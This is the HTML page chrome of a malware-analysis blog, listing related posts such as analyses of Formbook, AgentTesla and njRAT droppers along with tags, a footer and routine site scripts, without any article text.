href="/pecheck-malware-weight-loss/">Bad Guys Hate This Trick for Malware Weight Loss!</a><li><a href="/formbook-via-vbs-powershell-and-csharp/">Formbook Distributed Via VBScript, PowerShell, and C# Code</a><li><a href="/agenttesla-vba-certutil-download/">An AgentTesla Sample Using VBA Macros and Certutil</a><li><a href="/my-sans-dfir-netwars-experience/">My SANS DFIR NetWars Experience</a><li><a href="/making-meterpreter-look-google-signed/">Making Meterpreter Look Google Signed</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/smarter-not-harder-malware-analysis/"><div class="card-body"> <em class="timeago small" data-ts="1630800000" > 2021-09-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Smarter, Not Harder: Getting Malware to Help You Analyze It</h3><div class="text-muted small"><p> When analyzing even non-advanced malware nowadays it’s common to find pretty heavy levels of obfuscation within samples. PowerShell and .NET malware for Windows can be obfuscated easily using vario...</p></div></div></a></div><div class="card"> <a href="/a-tale-of-two-dropper-scripts/"><div class="card-body"> <em class="timeago small" data-ts="1641168000" > 2022-01-03 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>A Tale of Two Dropper Scripts for Agent Tesla</h3><div class="text-muted small"><p> In this post I want to look at two script files that drop Agent Tesla stealers on affected systems and show how adversary decisions affect malware analysis and detection. If you want to follow alon...</p></div></div></a></div><div class="card"> <a href="/agenttesla-vba-certutil-download/"><div class="card-body"> <em class="timeago small" data-ts="1648252800" > 2022-03-26 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>An AgentTesla Sample Using VBA Macros and Certutil</h3><div class="text-muted small"><p> AgentTesla is a .NET stealer that adversaries commonly buy and combine with other malicious products for deployment. In this post I’m tearing into a XLSM document that downloads and executes furthe...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/njrat-installed-from-msi/" class="btn btn-outline-primary" prompt="Older"><p>njRAT Installed from a MSI</p></a> <a href="/xloader-formbook-velvetsweatshop-spreadsheet/" class="btn btn-outline-primary" prompt="Newer"><p>XLoader/Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script>
